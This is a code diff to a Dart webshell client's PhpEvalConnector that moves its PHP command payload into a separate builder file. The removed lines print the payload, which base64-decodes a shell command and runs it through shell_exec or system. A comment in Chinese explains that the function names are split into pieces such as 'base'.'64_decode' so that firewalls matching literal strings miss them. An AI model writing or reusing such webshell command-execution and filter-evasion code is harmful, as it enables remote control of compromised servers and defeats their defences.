@@ -6,6 +6,7 @@ import 'package:http/http.dart' as http;
 
 import '../models/file_entry.dart';
 import '../utils/encoding_utils.dart';
+import 'php_command_payload.dart';
 import 'shell_script_dir_probe.dart';
 import 'shell_connector.dart';
 
@@ -97,22 +98,13 @@ class PhpEvalConnector extends ShellConnector {
     final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
         ? 'cd ${_sq(workingDir)} && '
         : '';
-    final b64 = base64.encode(utf8.encode('$cd$cmd'));
     // 先判断 shell_exec 是否可用，再二选一执行。
     // 不能用 `$o===null` 判断：shell_exec() 在命令“没有任何输出”时同样返回 null
     // （rm / mkdir / touch / cp / chmod… 都是静默命令），此时回退 system() 会把
     // 同一条命令再执行一次——这就是“一条命令执行两遍”的根因。
     // 关键词规避：用变量函数把 base64_decode / shell_exec / system 拆成
     // 'base'.'64_decode'，语义不变，但对"只看字面量"的 WAF 不命中。
-    final r = await sendPhpCode(
-      "\$f='base'.'64_decode';\$c=\$f('$b64');"
-      r"$d='preg'.'_split';"
-      r"$df=$d('/[\s,]+/',(string)@ini_get('disable_functions'),-1,PREG_SPLIT_NO_EMPTY);"
-      r"$s='shell'.'_exec';"
-      r"if(function_exists($s)&&!in_array($s,$df,true)){echo (string)@$s($c.' 2>&1');}"
-      r"$y='sys'.'tem';"
-      r"else{@$y($c.' 2>&1');}",
-    );
+    final r = await sendPhpCode(buildPhpCommandPayload('$cd$cmd'));
     return r.trim();
   }
 
